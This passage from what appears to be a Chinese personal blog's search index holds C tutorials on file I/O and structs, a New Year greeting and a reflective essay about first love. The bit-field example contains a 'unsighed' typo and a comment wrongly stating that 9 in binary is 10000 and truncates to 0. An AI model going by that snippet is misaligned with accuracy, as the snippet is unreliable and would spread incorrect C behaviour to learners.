class="params">(FILE *fp, <span class="type">const</span> <span class="type">char</span> *format, ...)</span> </span><br></pre></td></tr></table></figure><p>函数**fgetc()**只读取一个字符</p><p>函数 <strong>fgets()</strong> 从 fp 所指向的输入流中读取 n - 1 个字符。它会把读取的字符串复制到缓冲区 <strong>buf</strong>，并在最后追加一个 <strong>null</strong> 字符来终止字符串。</p><p>如果这个函数在读取最后一个字符之前就遇到一个换行符 ‘\n’ 或文件的末尾 EOF，则只会返回读取到的字符，包括换行符。也可以使用 <strong>int fscanf(FILE *fp, const char *format, …)</strong> 函数来从文件中读取字符串，但是在遇到第一个空格和换行符时，它会停止读取。</p><p>举个栗子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line">   <span class="type">char</span> buff[<span class="number">255</span>];</span><br><span class="line"> </span><br><span class="line">   fp = fopen(<span class="string">&quot;E:/test/1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">   <span class="built_in">fscanf</span>(fp, <span class="string">&quot;%s&quot;</span>, buff);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;1: %s\n&quot;</span>, buff );</span><br><span class="line"> </span><br><span class="line">   fgets(buff, <span class="number">255</span>, (FILE*)fp);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;2: %s\n&quot;</span>, buff );</span><br><span class="line">   </span><br><span class="line">   fgets(buff, <span class="number">255</span>, (FILE*)fp);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;3: %s\n&quot;</span>, buff );</span><br><span class="line">   fclose(fp);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会读取上一部分创建的文件，产生下列结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1: I</span><br><span class="line">2:  love you...</span><br><span class="line">3:You are beautiful...</span><br></pre></td></tr></table></figure><p>首先，<strong>fscanf()</strong> 方法只读取了 <strong>I</strong>，因为它在后边遇到了一个空格。其次，调用 <strong>fgets()</strong> 读取剩余的部分，直到行尾。最后，调用 <strong>fgets()</strong> 完整地读取第二行。</p><h1 id="二进制I-x2F-O函数"><a href="#二进制I-x2F-O函数" class="headerlink" title="二进制I&#x2F;O函数"></a>二进制I&#x2F;O函数</h1><p>下面两个函数用于二进制输入和输出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fread</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size_of_elements, </span></span><br><span class="line"><span class="params">             <span class="type">size_t</span> number_of_elements, FILE *a_file)</span>;</span><br><span class="line">              </span><br><span class="line"><span class="type">size_t</span> <span class="title function_">fwrite</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">size_t</span> size_of_elements, </span></span><br><span class="line"><span class="params">             <span class="type">size_t</span> number_of_elements, FILE *a_file)</span>;</span><br></pre></td></tr></table></figure><p>这两个函数都是用于存储块的读写 - 通常是数组或结构体。</p>]]></content>
      
      
      <categories>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言基础之结构体</title>
      <link href="/2023/01/09/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E4%B9%8B%E7%BB%93%E6%9E%84%E4%BD%93/"/>
      <url>/2023/01/09/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E4%B9%8B%E7%BB%93%E6%9E%84%E4%BD%93/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="结构体定义"><a href="#结构体定义" class="headerlink" title="结构体定义"></a>结构体定义</h1><p>有三种定义方法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">int</span> high;</span><br><span class="line">&#125;stu;<span class="comment">//其中stu为结构体变量，Student为结构体名字，这个结构体名字可以省略，于是就有第二种定义法</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">int</span> high;</span><br><span class="line">&#125;stu;</span><br><span class="line"></span><br><span class="line"><span class="comment">//也可以不省去结构体名称，在接下来的步骤中去定义变量</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">int</span> high;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span> <span class="title">stu</span>;</span></span><br></pre></td></tr></table></figure><h1 id="typedef"><a href="#typedef" class="headerlink" title="typedef"></a>typedef</h1><p>typedef可以重新定义结构体类型，简化定义变量时的步骤</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Student</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">int</span> high;</span><br><span class="line">&#125;Student;<span class="comment">//将struct Student类重新命名为Student</span></span><br><span class="line">Student stu;<span class="comment">//通过Student直接定义新的结构体变量</span></span><br></pre></td></tr></table></figure><h1 id="结构体嵌套"><a href="#结构体嵌套" class="headerlink" title="结构体嵌套"></a>结构体嵌套</h1><p>结构体是一种支持多层嵌套的类型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Birthday</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> year;</span><br><span class="line">    <span class="type">int</span> month;</span><br><span class="line">    <span class="type">int</span> day;</span><br><span class="line">&#125;Birthday;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Student</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">int</span> high;</span><br><span class="line">    Birthday birthday;<span class="comment">//将结构体Birthday嵌套进Student中</span></span><br><span class="line">&#125;Student;</span><br><span class="line">Student stu;</span><br><span class="line"><span class="comment">//访问</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;student name:%s student birthday:%d-%d-%d&quot;</span>,stu.name,stu.birthday.year,stu.birthday.month,stu.birthday.day);</span><br></pre></td></tr></table></figure><h1 id="结构体数组"><a href="#结构体数组" class="headerlink" title="结构体数组"></a>结构体数组</h1><p>结构体也是一种类型，所以可以使用数组来储存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Student</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">int</span> high;</span><br><span class="line">&#125;Student;</span><br><span class="line"><span class="type">void</span> <span class="title function_">printStudentinfo</span><span class="params">(Student *stu,<span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;name:%s\tid:%d\thigh:%d\n&quot;</span>,(stu+i)-&gt;name,(stu+i)-&gt;id,(stu+i)-&gt;high);<span class="comment">//若用指针访问元素则用-&gt;,若用数组访问可以用stu[i].name</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    Student stus[]=&#123;</span><br><span class="line">        &#123;<span class="string">&quot;zhangsan&quot;</span>,<span class="number">01</span>,<span class="number">190</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;lisi&quot;</span>,<span class="number">02</span>,<span class="number">192</span>&#125;</span><br><span class="line">    &#125;;<span class="comment">//定义结构体数组</span></span><br><span class="line">    printStudentinfo(stus,<span class="number">2</span>);<span class="comment">//利用函数打印结构体数组</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/01/09/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E4%B9%8B%E7%BB%93%E6%9E%84%E4%BD%93/%E7%BB%93%E6%9E%84%E4%BD%93%E6%95%B0%E7%BB%84.png"></p><h1 id="位域"><a href="#位域" class="headerlink" title="位域"></a>位域</h1><p>通过位域可以指定使用空间储存的位数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> a:<span class="number">4</span>;<span class="comment">//规定a不能超过4位</span></span><br><span class="line">    unsighed b:<span class="number">1</span>;<span class="comment">//规定b不能超过1位</span></span><br><span class="line">&#125;bit,*pbit;</span><br><span class="line"></span><br><span class="line">bit.a=<span class="number">8</span>;<span class="comment">//若bit.a大于8，则只会留下位域内的值，其余值将丢弃</span></span><br><span class="line">bit.b=<span class="number">1</span>;</span><br><span class="line">pbit=&amp;bit;</span><br><span class="line">pbit-&gt;a=<span class="number">9</span>;<span class="comment">//此步超过了位域，则pbit-&gt;a变为0，因为9用二进制表示为10000</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结构体题型后续更新……</p>]]></content>
      
      
      <categories>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Happy new year</title>
      <link href="/2023/01/01/Happy-new-year/"/>
      <url>/2023/01/01/Happy-new-year/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="新年快乐！！！"><a href="#新年快乐！！！" class="headerlink" title="新年快乐！！！"></a>新年快乐！！！</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>The story of you and sun</title>
      <link href="/2022/12/31/The-story-of-you-and-sun/"/>
      <url>/2022/12/31/The-story-of-you-and-sun/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a href="http://www.hshdweb.cn/?p=32">你与阳光的故事</a><br>  每个人都有年少，每个人都会在年少中徘徊，想要一直抓住青春的尾巴，但青春是抓不住的，到头来也能是回忆青春残存的美好，在脑海深处去拽出那唯一一点舍不得丢掉的东西。<br>  每个男孩的青春里都曾住过一个足以用一生去释怀的女孩。你与这个女孩的开始可能是一次偶遇，可能是一次交流，可能是一起成为同桌互相学习，可能是久识情感的升温。这个女孩扰乱了你原本风平浪静的心，在心里荡漾起来春心。你会无时无刻不在想念她，无时无刻不在关心她。但你总是藏在角落，你害怕在阳光下暴露自己，你害怕阳光不愿意接受你，你更害怕失去阳光，所以你只能在角落偷偷看着阳光，因为只有这样你才能在某个瞬间得到一点阳光的温暖。你会记下每一次阳光来临时的感受，夸赞她对你来说是多么重要，以及她对你施舍的那一点温暖是多么珍贵，你总是这样麻痹自己。但好像阳光照耀的总是世界，你又有几分实力与世界去抢夺阳光。<br>  直到有一天，你发现自己的青春好像要结束了，在角落的你那仅存的一点阳光似乎将要离去，你不甘心，所以你开始觉悟，你要将阳光留在这里。你筹划好一切，在阳光下暴露了自己，但好像阳光对你却心生胆怯，用几朵你知道是炊烟所化的浮云打发了你。从此，你好像看不到阳光了，但你从来不会忘记阳光那微不足道的温暖。你妄想那几朵浮云终会散开，你终会与阳光我再见，但你错了，阳光不会撕开浮云，因为那本来就是为躲避你所准备的。<br>  是啊，你悲伤，你心痛，你想向阳光乞求同情。你保持与阳光交流，保持向阳光诉说，阳光没对你有任何答复。你安慰自己阳光是很忙的，等空下来一定会答复你，可在阳光眼里，你比乌云更另她烦躁，她从来不想给你任何答复，哪怕她正无聊得发呆。童话中的美好故事，都往往只是为了满足人们对美好的向往所编撰，现实中的阳光，不会因你而停留，她只会为夏至停留，并且也只是停留一小会儿罢了。<br>  你回到了你自己的角落，只能眼睁睁地看着阳光离开，大道理你都懂，但你无法控制你自己，你躲在角落，哭泣，悔恨。你痛恨自己的无能，痛恨自己的懦弱，18 岁的你迷茫又浮躁，想要车，想要房子，爱情，想要享受生活想去旅行，你那么浮躁，却想看透人生，这便注定了阳光的离去。<br>  三年过去了，来到了大学，看到了很多形形色色的人，但好像对她你还是情有独钟，你坐在桌子前，看着无意间看到了杨绛先生写下的一段话 ：无论什么关系，当情分被消耗殆尽，缘分便走到了终点，把错归咎于自己，并且礼貌的退场，把自己还给自己，把别人还给别人，让花成花，让树成树，从此山水一程，再不相逢，愿来生不见，不欠，不念。此时的你不知道自己到底释没释怀，你只知道这句话真的很让人心痛。</p>]]></content>
      
      
      <categories>
          
          <category> 博主情感录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 情感 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
